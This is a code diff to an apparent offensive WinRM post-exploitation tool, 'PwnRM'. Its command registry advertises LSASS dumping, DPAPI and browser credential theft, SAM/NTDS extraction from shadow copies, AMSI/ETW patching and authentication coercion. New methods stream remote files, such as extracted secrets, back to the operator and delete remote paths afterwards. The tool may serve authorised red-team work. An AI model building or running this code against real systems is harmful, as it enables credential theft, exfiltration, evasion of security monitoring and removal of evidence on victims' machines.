@@ -124,7 +124,7 @@ COMMAND_REGISTRY = {
         "!adcs [--quick] [--template <T>] [--ca <CA>] [--alt SAN] [--wsus]": "ADCS CA/template/ACL & WSUS triage",
         "!kerberos [roast|asrep|rbcd|dmsa|diamond]": "Kerberos exposure, RBCD and dMSA triage",
         "!entra [full]": "Entra join-state and cloud-cache inventory",
-        "!creds [vault|dpapi|decrypt B64|history|browser|lsa] [--lsa-output PATH]": "Credential artifacts, DPAPI unprotect & LSASS dump",
+        "!creds [vault|dpapi|decrypt B64|history|browser|lsa] [--lsa-output PATH] [--download]": "Credential artifacts & ephemeral LSASS parsing",
         "!laps [all|encrypted]": "Windows LAPS hunter (Legacy & Server 2025)",
         "!acl [tier0] [--target <T>]": "Active Directory DACL & privilege escalation scout",
         "!token [list|privs]": "Process token inventory & privilege audit",
@@ -132,7 +132,7 @@ COMMAND_REGISTRY = {
         "!lateral [--subnet <s>] [--ports P] [--probe-auth]": "Bounded subnet and service scout",
     },
     "Collection, Runtime & In-Memory Execution": {
-        "!vss [sam|ntds] [--drive C:]": "WMI VSS hive/database staging (SAM/NTDS)",
+        "!vss [sam|ntds] [--drive C:] [--download]": "Ephemeral VSS extraction & secret display",
         "!coerce [webdav|smb|all] --listener <IP> [--port N]": "Outbound UNC authentication probe",
         "!evasion [edr|amsi|etw]": "Runtime AMSI/ETW patch & EDR scout",
         "!adtriage [--quick]": "AD post-auth quick triage",
@@ -1522,6 +1522,87 @@ Write-Output "PwnRM background No-Consolation job started: $jobId"
                 "  The WinRM server returned a path containing unsafe or injection characters."
             )
         return stripped
+
+    def read_remote_file(self, remote_path: str, max_bytes: int | None = None) -> bytearray:
+        """Stream one remote file into memory and verify its SHA-256 trailer."""
+        path_raw = self.run_sync(
+            f"Resolve-Path -LiteralPath '{self._pse(remote_path)}' | Select -Expand Path"
+        )
+        if not path_raw:
+            raise FileNotFoundError(f"remote file not found: {remote_path}")
+        path = self._validate_remote_path(path_raw)
+        path_ps = self._pse(path)
+        if self.run_sync(f"Test-Path -LiteralPath '{path_ps}' -PathType Container").strip().lower() == "true":
+            raise IsADirectoryError(f"remote path is a directory: {path}")
+
+        if max_bytes is None:
+            try:
+                max_bytes = int(os.environ.get("PWNRM_MAX_DL", 256 * 1024 * 1024))
+            except ValueError:
+                max_bytes = 256 * 1024 * 1024
+        if max_bytes <= 0:
+            raise ValueError("maximum remote file size must be positive")
+
+        transfer_chunk_size = self._transfer_chunk_size()
+        script = f"""
+$hash = Get-FileHash -LiteralPath '{path_ps}' -Algorithm SHA256 | Select-Object -ExpandProperty Hash
+$file = [System.IO.File]::OpenRead('{path_ps}')
+try {{
+    $buffer = New-Object byte[] {transfer_chunk_size}
+    while (($count = $file.Read($buffer, 0, $buffer.Length)) -gt 0) {{
+        [Convert]::ToBase64String($buffer, 0, $count)
+    }}
+}} finally {{
+    $file.Dispose()
+}}
+[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($hash))
+"""
+        streamed = bytearray()
+        error_count = len(getattr(self, "last_run_errors", []))
+
+        def collect(output):
+            stdout = output.get("stdout")
+            if not stdout:
+                return
+            for line in str(stdout).splitlines():
+                encoded = line.strip()
+                if not encoded:
+                    continue
+                chunk = b64decode(encoded, validate=True)
+                if len(streamed) + len(chunk) > max_bytes + 64:
+                    raise RuntimeError(f"remote stream exceeds {max_bytes} bytes")
+                streamed.extend(chunk)
+
+        try:
+            interrupted = self.run_with_interrupt(script, collect)
+            if interrupted:
+                raise InterruptedError(f"remote file streaming interrupted: {path}")
+            new_errors = getattr(self, "last_run_errors", [])[error_count:]
+            if new_errors:
+                raise OSError("; ".join(new_errors))
+            if len(streamed) < 64:
+                raise OSError("remote stream did not include a SHA-256 trailer")
+            payload = bytearray(streamed[:-64])
+            expected = SHA256.new(payload).hexdigest().upper().encode("ascii")
+            if streamed[-64:] != expected:
+                payload[:] = b"\x00" * len(payload)
+                raise OSError("remote file SHA-256 verification failed")
+            return payload
+        finally:
+            streamed[:] = b"\x00" * len(streamed)
+
+    def delete_remote_path(self, remote_path: str, recursive: bool = False) -> bool:
+        """Delete one validated remote path and verify that it no longer exists."""
+        path = self._validate_remote_path(remote_path)
+        path_ps = self._pse(path)
+        recurse = " -Recurse" if recursive else ""
+        error_count = len(getattr(self, "last_run_errors", []))
+        result = self.run_sync(
+            f"if (Test-Path -LiteralPath '{path_ps}') {{ "
+            f"Remove-Item -LiteralPath '{path_ps}' -Force{recurse} -ErrorAction Stop }}; "
+            f"Test-Path -LiteralPath '{path_ps}'"
+        ).strip().lower()
+        return result == "false" and len(getattr(self, "last_run_errors", [])) == error_count
 
     # ── !download (FIX-01, FIX-03, FIX-07, OPT-07) ────────────────────────────
     def download(self, cmdline: str):
